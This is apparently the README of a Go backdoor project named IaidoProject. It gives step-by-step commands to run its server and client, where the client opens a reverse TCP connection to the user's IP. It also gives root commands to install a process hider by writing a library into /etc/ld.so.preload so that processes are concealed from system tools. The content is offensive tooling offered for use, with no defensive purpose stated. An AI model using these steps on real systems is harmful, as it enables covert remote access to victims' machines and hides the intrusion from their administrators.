<p align="center">
  <img src="https://vsoch.github.io/assets/images/posts/learning-go/gophercises_jumping.gif" width="420" height="440">
</p>

  	                A Simple Backdoor Written in Go

---

<p align="center">
	How to Install?
</p>

```bash
git clone https://github.com/T0k1To/IaidoProject
```
---

<p align="center">
	Server Usage:
</p>

```bash
cd IaidoProject
```
```bash
go run IaidoSV.go
```
---

<p align="center">
	Client Usage:
</p>

```bash
cd IaidoProject
```
```bash
cd bin
```
```bash
./Iaido
```
- Wait to load and insert your ip to receive the reverse tcp connection and enjoy =]
---

<p align="center">
	What is processhider.c?
</p>

```This is a simple C code to hide a process in Linux using ld preloader by Gianluca Borello!```

<p align="center">
	processhider.c Usage:
</p>

`With root proceed:`

```bash
cd IaidoProject
```
```bash
make
```
```bash
sudo mv libprocesshider.so /usr/local/lib/
```
```bash
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
```

- References and Credits:
  - https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/

  - https://github.com/gianlucaborello/libprocesshider

---
